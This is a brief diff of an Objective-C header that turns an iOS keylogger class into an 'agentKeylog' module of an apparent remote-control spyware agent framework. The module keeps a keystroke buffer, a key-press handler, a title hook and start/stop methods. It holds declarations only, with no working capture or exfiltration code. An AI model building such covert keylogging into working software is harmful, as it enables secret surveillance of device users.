@@ -9,27 +9,20 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 
+#import "RCSIAgent.h"
+
 #define KEY_MAX_BUFFER_SIZE   0x10
 
-
-@interface RCSIKeyLogger : NSObject
+@interface agentKeylog : RCSIAgent
 {
   NSMutableString *mBufferString;
   BOOL mContextHasBeenSwitched;
 }
 
-@property (readwrite) BOOL mContextHasBeenSwitched;
-
-- (id)init;
-- (void)dealloc;
-
+- (void)setTitleHook: (id)arg1;
 - (void)keyPressed: (NSNotification *)aNotification;
 
-@end
-
-@interface myUINavigationItem : NSObject
-
-- (id)title;
-- (void)setTitleHook: (id)arg1;
+- (BOOL)start;
+- (void)stop;
 
 @end
